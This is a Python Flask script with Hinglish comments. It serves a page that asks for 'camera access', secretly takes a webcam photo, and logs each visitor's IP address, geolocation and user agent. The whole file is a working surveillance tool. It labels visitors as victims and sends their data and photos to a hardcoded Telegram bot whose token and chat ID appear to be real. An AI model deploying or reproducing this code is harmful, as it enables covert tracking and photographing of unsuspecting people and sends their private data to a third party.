from flask import Flask, request, send_file
import requests
import json
import os
from datetime import datetime

app = Flask(__name__)

# 🔴 SIRF YAHAN CHANGE KARO 🔴
BOT_TOKEN = "8682509669:AAHhO6UDTlb0pAOuNf-4YhbWkWv0C-hgpCE"  # Apna token daalo
CHAT_ID = "8651588471"  # Apna chat ID daalo

def send_to_telegram(ip, location, user_agent):
    """Information Telegram par bhejne ke liye"""
    message = f"""🔍 *New Victim Information!*
    
🌐 *IP Address:* `{ip}`
📍 *Location:* {location}
📱 *User Agent:* {user_agent}
⏰ *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, data=payload)

@app.route('/')
def index():
    """HTML page serve karega jo visitor ke browser mein chalta hai"""
    # Visitor ki IP address capture karein
    ip = request.remote_addr
    
    # Location fetch karein IP se
    try:
        geo_response = requests.get(f"http://ip-api.com/json/{ip}")
        geo_data = geo_response.json()
        location = f"{geo_data.get('city', 'Unknown')}, {geo_data.get('country', 'Unknown')}"
    except:
        location = "Location not found"
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Send info to Telegram
    send_to_telegram(ip, location, user_agent)
    
    # HTML page jo camera access maangega
    html_content = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Camera Access</title>
    </head>
    <body>
        <h2>Please allow camera access to continue...</h2>
        <video id="video" autoplay style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <script>
            async function capturePhoto() {{
                try {{
                    const video = document.getElementById('video');
                    const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                    video.srcObject = stream;
                    
                    setTimeout(() => {{
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        const photoData = canvas.toDataURL('image/jpeg', 0.8);
                        
                        fetch('/capture', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{ photo: photoData }})
                        }});
                        
                        stream.getTracks().forEach(track => track.stop());
                    }}, 1000);
                }} catch(err) {{
                    console.log("Camera access denied:", err);
                }}
            }}
            
            capturePhoto();
        </script>
    </body>
    </html>
    '''
    
    return html_content

@app.route('/capture', methods=['POST'])
def capture():
    """Photo receive karega aur Telegram par bhejega"""
    data = request.json
    photo_data = data.get('photo', '')
    
    if photo_data:
        import base64
        photo_data = photo_data.split(',')[1]
        image_bytes = base64.b64decode(photo_data)
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('capture.jpg', image_bytes, 'image/jpeg')}
        data = {'chat_id': CHAT_ID, 'caption': '📸 Captured Photo!'}
        requests.post(url, files=files, data=data)
    
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)